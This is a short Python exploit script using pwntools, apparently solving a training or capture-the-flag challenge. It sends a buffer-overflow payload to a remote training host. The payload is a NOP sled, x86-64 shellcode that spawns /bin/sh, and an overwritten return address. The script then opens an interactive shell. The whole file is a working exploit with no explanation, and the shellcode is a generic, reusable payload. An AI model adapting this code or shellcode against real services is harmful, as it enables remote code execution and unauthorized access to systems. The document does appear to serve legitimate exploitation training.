from pwn import *

shellcodeLenght = 27
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
bufferAddress = 0x00601080

string = "\x90"*(1016-27) + shellcode + p64(bufferAddress)
s = remote("training.jinblack.it", 2001)
#r = process("./shellcode")
s.send(string)
raw_input("WAIT")
s.interactive()